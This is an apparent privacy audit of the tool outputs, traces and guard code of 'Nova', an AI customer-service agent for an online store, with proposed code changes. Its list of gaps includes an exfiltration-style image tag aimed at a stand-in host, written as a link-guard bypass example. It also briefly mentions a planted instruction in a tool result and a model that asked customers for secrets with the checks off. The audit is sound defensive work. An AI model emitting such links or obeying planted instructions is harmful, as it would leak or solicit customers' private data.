# Privacy audit: every field the six tools return, and whether any answer needs it

Nova can only repeat what it is shown, so the cheapest privacy control is a field that never reaches the model.
This audit lists every field the six tools return (the SQL in `agent/tools_v0.py`, shaped by `agent/tools_v2.py`),
says what it is and whether it is personal data, checks whether any eval case needs it, counts how often models
actually repeat it to customers, and recommends keep, mask or remove.

**Applied** (after this audit): the drops and date cuts below are made by `agent/privacy.py` `minimise()`, which the
guard layer runs on every tool result before the model reads it; the tools themselves are unchanged, so earlier
runs can be repeated exactly. The ticket summary is redacted inside `escalate_to_human`. The first-name change
to the system prompt is **not** applied: it changes the model's input and waits for the next prompt version.

**Result.** The tools are already minimised where it matters most: no street address, pincode, phone, email,
card number or bank detail is selected anywhere (`tests/test_guardrails.py` checks the SQL). What is left to trim
is small: three internal ids nobody uses (`shipment_id`, `return_id`, `refund_id`), one timestamp that only says
when the customer added bank details (`bank_details_added_at`), the time of day on five order and refund
timestamps, and the customer's full name in the system prompt. Every field any case needs stays.

## How "needed" and "repeated" were measured

- **Needed.** For each of the 197 cases (golden 107, fresh 50, simulated 40) every `expect.must_include` fact was
  matched against the values each order tool returns for that case's orders, run as the case's customer on the
  seeded store. A field is *needed* if it is the only place a required fact can come from, or if it is a tool
  argument some case expects (`line_no` for `propose_return`). Facts found in no tool field come from the help
  center (`must_include` like "15 day", "order page").
- **Repeated.** In 277 saved conversations (`2026-11-25_golden-sft2a_v1-l4`, `_fresh-sft2a_v1-l4`,
  `_sim-sft2a-r1..r3`, all with the tools that are in use now), for each field returned, whether its value
  appears in a later reply of the same conversation. Dates are matched as "17 Nov" / "2026-11-17" style, times as
  "16:50". This is a value match, so a number the customer typed counts too; it is an upper bound.

"Personal data" below means data about the signed-in customer. Strictly, every order fact is personal once it is
tied to an account (under India's DPDP Act any data about an identifiable person is); the column says which
fields identify or locate a person on their own, which describe their purchases or money, and which are not
about the person at all.

## list_my_orders

| Field | What it is | Personal? | Needed by | Repeated | Recommendation |
|---|---|---|---|---|---|
| `order_id` | order number | purchase record | 19 cases (sole source); every order lookup | 26 / 134 | **keep** |
| `placed_on` | date placed (already a date) | purchase record | customers name orders by month ("my mouse from June", sim knowledge) | 7 / 134 | **keep** |
| `status` | order status | purchase record | `ord-019` "packed" (also in tracking) | 12 / 134 | **keep** |
| `total_inr` | order total | purchase record | `ret-005` 598 (sole source); `ord-005` 548 | 2 / 134 | **keep** |
| `items` | product names, comma-joined | purchase record; text written by sellers (untrusted) | how customers name orders | 21 / 134 | **keep** (already scrubbed by `scrub_result`) |

## get_order_status

| Field | What it is | Personal? | Needed by | Repeated | Recommendation |
|---|---|---|---|---|---|
| `order_id` | order number | purchase record | many | 88 / 96 | **keep** |
| `status` | order status | purchase record | 5 cases (also in tracking) | 26 / 96 | **keep** |
| `placed_at` | timestamp placed, to the minute | purchase record; time of day is behavioural | the date only (order naming); no case needs the time | date 5, time 1 / 96 | **mask** to the date |
| `cancelled_at` | timestamp cancelled | purchase record | no case | date 1, time 0 / 9 | **mask** to the date |
| `payment_method` | upi / card / wallet / cod (a category, no number) | financial, coarse | no case is its sole source; it says where a refund goes *before* a refund row exists (a cancelled card order), and the help center keys refund timing by method | 29 / 96 by value match, an overcount: most are the refund `method` (the same word) or "card" in "the Confirm card" | **keep** |
| `total_inr` | order total | purchase record | 13 cases; `ret-005` sole source | 27 / 96 | **keep** |
| `shipping_fee_inr` | shipping charge | purchase record | `ord-005` ("why did I pay 548": 499 + 49, sole source) | 1 / 9 | **keep** |
| `ship_city` | delivery city (never street or pincode) | locates the person, coarse | no case is its sole source (the 6 cases that mention a city get it from `last_scan_location` too); answers the design question "which address is my order going to?" (`db/QUESTIONS.md` Q9, `pol-f11`) | 2 / 96 | **keep**; never widen to street or pincode |
| `items[].line_no` | item line number | no | expected argument of `propose_return` (17 cases) | n/a | **keep** |
| `items[].name` | product name | purchase record; seller text (untrusted) | 75 / 96 | 75 / 96 | **keep** |
| `items[].category` | electronics / home / accessories | no | return window rules (7 vs 15 days) | 9 / 96 | **keep** |
| `items[].qty` | quantity | purchase record | `ret-005` (2 doormats = 598) | n/a | **keep** |
| `items[].unit_price_inr` | price paid per item | purchase record | 5 cases sole source (`ret-001` 1199, `ret-002` 2799, ...) | 27 / 96 | **keep** |
| `items[].opened` | seal broken | purchase record | opened-electronics and hygiene cases | n/a | **keep** |
| `returns[].return_id` | internal return id (1, 2, ... for seeded returns) | no | no case; the Confirm card uses `proposal_id` from `propose_return`, not this | 0 / 17 | **remove** |
| `returns[].status` | proposed / confirmed / picked_up / refunded / rejected | purchase record | `ret-f07` "picked up" (sole source); claim guard evidence | 13 / 21 | **keep** (`agent/guardrails.py` `_evidence` reads it) |
| `returns[].reason` | why the customer returned it | purchase record | no fact; context for "is my faulty return accepted" | 1 / 21 | **keep** |
| `returns[].proposed_at` | timestamp proposed | purchase record | no case | 0 / 21 | **mask** to the date |
| `returns[].pickup_date` | scheduled pickup (a date) | purchase record; tells when someone will be home | `ret-012` (the date, by the case notes) | 6 / 17 | **keep** |
| `returns[].picked_up_at` | timestamp picked up | purchase record | `ret-f07` (the day) | date 5, time 0 / 16 | **mask** to the date |
| `returns[].rejection_reason` | outside_window / opened_not_faulty / ... | purchase record | 3 cases sole source (`ret-014`, `ret-015`, `ret-f04`) | 1 / 4 | **keep** |
| `returns[].rejected_at` | timestamp rejected | purchase record | no case | 0 / 4 | **mask** to the date |
| `returns[].line_nos` | which lines are in the return | no | which item a return covers on multi-item orders | n/a | **keep** |
| `refunds[].refund_id` | internal refund id | no | no case | 0 / 16 | **remove** |
| `refunds[].amount_inr` | refund amount | financial | 8 cases | 19 / 20 | **keep** |
| `refunds[].method` | upi / card / wallet / bank_transfer | financial, coarse | `ord-023` "bank transfer" (sole source) | 17 / 20 | **keep** |
| `refunds[].status` | initiated / awaiting_bank_details / completed | financial | `ret-013` "bank details" (sole source); claim guard evidence | 17 / 20 | **keep** |
| `refunds[].initiated_at` | timestamp started | financial | no case needs the time | date 2, time 0 / 20 | **mask** to the date |
| `refunds[].bank_details_added_at` | when the customer added bank details | financial: reveals bank details are on file | no case; `status` already says whether details are awaited | 0 / 1 | **remove** |
| `refunds[].completed_at` | timestamp completed | financial | "was my refund sent, when" (the day) | date 17, time 0 / 19 | **mask** to the date |

When there is no return or refund, `returns` / `refunds` are a sentence ("No refund has been issued for this
order."): not personal, **keep**.

## get_tracking

| Field | What it is | Personal? | Needed by | Repeated | Recommendation |
|---|---|---|---|---|---|
| `order_id`, `order_status`, `shipped`, `note` | the order and why there is no tracking | purchase record | many | 84 / 88 (order id) | **keep** |
| `shipments[].shipment_id` | internal box id | no | no case; boxes are told apart by `tracking_no` (unique) and `items` | 0 / 88 | **remove** |
| `shipments[].carrier` | carrier name | no; carrier feed text (untrusted) | `ord-008` "SwiftShip" (sole source) | 44 / 88 | **keep** |
| `shipments[].tracking_no` | carrier tracking number | purchase record (lets anyone track the parcel on the carrier's site) | 14 cases sole source | 32 / 88 | **keep**; only ever the customer's own |
| `shipments[].status` | box status | purchase record | 4 cases | 55 / 88 | **keep** |
| `shipments[].eta` | estimated delivery date | purchase record | late-order cases | 43 / 85 | **keep** |
| `shipments[].delivered_at` | delivery timestamp | purchase record; time of day says when someone was home | delivered-not-received cases use the time to check with the household | date 21, time 1 / 36 | **keep** (the time is the evidence in a "never got it" dispute) |
| `shipments[].items` | which products are in the box | purchase record; seller text | split shipments | 59 / 88 | **keep** |
| `shipments[].last_scan_at` | last scan timestamp | about the parcel | late and lost cases | date 61, time 6 / 85 | **keep** |
| `shipments[].last_scan_location` | hub or city of the last scan | about the parcel; carrier text (untrusted) | 18 cases sole source (Nagpur, Jaipur, ...) | 55 / 85 | **keep** |
| `shipments[].last_scan_event` | last scan event | about the parcel; carrier text (untrusted) | 4 cases ("out for delivery", "delivered") | 23 / 88 | **keep** |

## search_help_center, propose_return, escalate_to_human

| Tool.field | Personal? | Needed by | Repeated | Recommendation |
|---|---|---|---|---|
| `search_help_center.results[].id` | no | citations `[kb:...]` | 67 / 103 | **keep** |
| `search_help_center.results[].title`, `.text`, `.effective_date`, `note` | no; text anyone with edit access writes (untrusted, scrubbed) | every policy case | text is paraphrased, never copied whole | **keep** |
| `propose_return.order_id`, `line_no`, `item`, `eligible`, `reason`, `window_days`, `delivered_on` | purchase record | 17 return cases | item 31 / 33 | **keep** |
| `propose_return.refund_estimate_inr` | financial | 4 cases (`ret-001` 1199, ...) | 16 / 19 | **keep** |
| `propose_return.proposal_id` | no | not said to customers (0 / 19), but `agent/state.py` keeps it as the open proposal and the Confirm card posts it to `/returns/{proposal_id}/confirm` | 0 / 19 | **keep** |
| `propose_return.note` | no | tells the model to ask for Confirm | 0 / 19 | **keep** |
| `escalate_to_human.ticket_id` | no | the customer's reference for the hand-off | 76 / 79 | **keep** |
| `escalate_to_human.handed_off`, `note` | no | | | **keep** |

Arguments matter too: `escalate_to_human(summary=...)` is free text the model writes from the customer's words,
stored in `tickets.summary`. With the hand-off rules on (`agent/escalation.py` `HandoffRules.rewrite`), the
model's summary is replaced by one built in code, with the customer's words passed through `redact()`; without
them the model's text is stored as written. See the code changes below.

## Outside the tools: the system prompt and the traces

| Item | Where | Today | Recommendation |
|---|---|---|---|
| `customer_name` | system prompt: "The signed-in customer is {customer_name}." (`agent/prompts.py`) | the full name (`customers.full_name`) on every model call and in every trace | **mask** to the first name. In the simulated runs the model uses only the first name ("You're welcome, Neha.", 14 of 40); in 3 adversarial golden cases (`adv-003`, `adv-006`, `adv-007`) it said the full name back while refusing another person's orders. No case needs the surname, and the full name is the one field that makes a trace identify a person by itself |
| Customer messages, tool results | `traces.jsonl`, and the production traces the retention script expects | stored raw | **mask** in the kept copy with `agent.privacy.redact_obj`; raw kept 30 days (`scripts/prune_traces.py`) |
| Tool-call log line `args` | `nova.tools` INFO line in `agent/loop.py` | now passed through `redact()` (the summary and the search query can carry the customer's words) | **mask**: done in the working tree |
| `trace["output_guard"]["original"]`, `trace["tool_calls"][].args` | each trace | the reply as the model wrote it, before the filter replaced it, and the raw arguments: exactly the text the filter exists to stop | **mask** in the kept copy (`redact_obj` reaches every string) |

## Recommended code changes (not applied)

Shaping belongs in `agent/tools_v2.py`, not in the SQL of `agent/tools_v0.py`: the first tools are kept so old
runs can be repeated exactly.

```diff
# agent/tools_v2.py
+DROP = {"shipment_id", "return_id", "refund_id", "bank_details_added_at"}   # internal or not needed by any answer
+DAY_ONLY = {"placed_at", "cancelled_at", "proposed_at", "picked_up_at", "rejected_at", "initiated_at", "completed_at"}
+
 def compact(row: dict) -> dict:
-    """Drop empty fields: a null is a blank the model may fill, and it costs tokens."""
-    return {k: v for k, v in row.items() if v is not None and v != []}
+    """Drop empty fields, fields no answer needs, and the time of day where only the day matters."""
+    return {k: (v.date() if k in DAY_ONLY and hasattr(v, "date") else v)
+            for k, v in row.items() if v is not None and v != [] and k not in DROP}
```

`compact` already runs on the order, its items, returns, refunds and every shipment, so this one change covers
all eleven fields. Keys keep their names (`placed_at` now holds `2026-11-17`), so `agent/state.py`,
`evals/judge_units.py` (reads `placed_at[:10]`) and the claim guard keep working. `delivered_at` and
`last_scan_at` are deliberately not in `DAY_ONLY`.

```diff
# agent/tools_v2.py, escalate_to_human: the ticket gets no phone, card or email the customer typed
+from agent.privacy import redact
 ...
-                     VALUES (%s, %s, %s, 'open', %s, %s)""", (tid, session.customer_id, reason, now(), summary))
+                     VALUES (%s, %s, %s, 'open', %s, %s)""", (tid, session.customer_id, reason, now(), redact(summary)))
```

```diff
# agent/tools_v2.py, Session: a first name for the prompt; the full name stays for the app
+    @property
+    def first_name(self) -> str:
+        return (self.customer_name.split() or ["there"])[0]
# callers: evals/run_eval.py, agent/chat.py, evals/long_chat.py, synth/generate.py, synth/no_tool.py
-    system_prompt(now(), session.customer_name, ...)
+    system_prompt(now(), session.first_name, ...)
```

```diff
# tests/test_guardrails.py: hold the line in a test, next to the SQL check
+def test_no_tool_result_carries_internal_ids_or_bank_timestamps():
+    for result in <one call of each tool for an eval customer with a return and a refund>:
+        assert not set(flat_keys(result)) & {"shipment_id", "return_id", "refund_id", "bank_details_added_at"}
```

**Cost of the change.** The fine-tuned adapters were trained on tool results that include these fields. The
change only removes keys and shortens timestamps, so it should not confuse them, but the golden and fresh sets
must be re-run before it ships, and the next training mix should be rendered with the new shapes. The first-name
change alters the prompt text every model sees; record it as a new prompt version, as `agent/prompts.py` asks.

## The help center

- `kb/privacy.md` says Nova shares "order, shipment, return, refund and payment details": consistent with keeping
  `payment_method` and the refund `method`.
- `kb/privacy.md` "Conversation records" says chats are kept but gives no period. Once production traces are
  written, it should state the rule: raw records 30 days, a copy with phone numbers, cards and emails masked for a
  year.
- `kb/privacy.md` and `kb/cash-on-delivery.md` say never to share bank details in chat. Nothing in
  `agent/privacy.py` catches a bank account number or IFSC code, so if a customer pastes them anyway they are kept
  unmasked in both trace copies (see the gaps below).
- `kb/account-and-address.md` answers address and phone-change questions from policy; no tool needs the address.

## Gaps found in agent/privacy.py and agent/guardrails.py (described, not fixed)

1. **`output_filter()` runs only when the guards are on.** It was wired into `Guard.outgoing` while this audit
   was written; a run without `--guards` (and `agent/chat.py`, which passes no guard) sends replies unfiltered.
   It is also called without `own_email`, so a reply with the customer's own address is blocked too (harmless:
   no tool returns an email).
2. **Traces are still written raw.** `evals/run_eval.py` writes `traces.jsonl` without `redact_obj`, and there is
   no production trace writer yet: `scripts/prune_traces.py` expects the `logs/traces/raw` + `redacted` layout
   that writer should produce. The log line's `args` are redacted now; `log.exception` in `call_tool` can still
   carry a database error message that quotes an argument.
3. **Indian identifiers the patterns miss** (checked by running them): a UPI ID such as `asha.k@okicici` (the email
   pattern needs a dot after the @; `9876543210@ybl` is caught only because it starts with a phone number), a bank
   account number that fails the Luhn check, an IFSC code (`HDFC0001234`), an Aadhaar number (`2345 6789 0123`;
   a Verhoeff check would separate it from a 12-digit UPI reference, which must pass), a PAN (`ABCDE1234F`).
4. **Phone formats the pattern misses**: `919876543210` (country code without `+`), `987 654 3210`,
   `+91 9876 543 210`, `+91.98765.43210`. Each is a plausible way a customer types their number.
5. **The link guard misses links without a scheme**: `<img src="//evil.example/x?d=10482">` and a bare
   `evil.example/x?d=1` pass `guard_reply` unchanged. Harmless only while the chat UI renders replies as plain
   text; it should be checked when the UI is built.
6. **No reply check for asking for secrets.** The help center promises Nova never asks for a password, OTP, full
   card number, CVV, UPI PIN or bank details in chat, and evals/reports/05a_attacks.md records SFT-2a doing exactly
   that with the checks off. With the checks on, the planted instruction was cut from the tool result; no check
   looks at the reply itself for such a request.
7. **Redaction is pattern-only.** The "redacted" trace still holds the customer's full name (system prompt),
   order ids, delivery city and item names: it is pseudonymous, not anonymous, and should be treated as personal
   data for its year. The first-name change above shrinks this; dropping the system message from the kept copy
   (it is the same template every time) would remove the name entirely.
8. **The network-import test covers the tool code only** (`agent/tools_v*.py`, `agent/returns.py`,
   `rag/search.py`). `agent/loop.py`, `agent/guardrails.py`, `agent/privacy.py` and `api/` are not in the list;
   none imports a network library today.
